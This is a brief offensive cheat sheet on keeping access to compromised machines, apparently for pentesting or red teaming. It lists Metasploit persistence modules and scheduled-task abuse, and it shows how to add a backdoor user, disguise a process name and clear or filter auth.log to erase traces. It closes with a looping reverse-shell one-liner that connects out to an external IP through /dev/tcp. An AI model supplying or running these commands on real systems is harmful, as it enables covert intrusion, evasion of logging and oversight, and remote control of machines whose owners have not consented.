Maintaining Access

## Methods:
**In Metasploit:**
run persistence -h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence

**Scheduled Tasks:**
run scheduleme
run schtaskabuse



**Add a user:**
net user <user> <pass> /add
This is most useful during pentests, not red teaming

**Linux:**
Line sending via ssh:
rlwrap ssh user@host

**SSH without log:**
ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"

**Run a command under different name:**
exec -a syslogd <command>

**Clearing Logs:**
cat /dev/null >/var/log/auth.log

cd /dev/shm
grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log

**Permenant Refer Shell:**
while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done &>/dev/null &

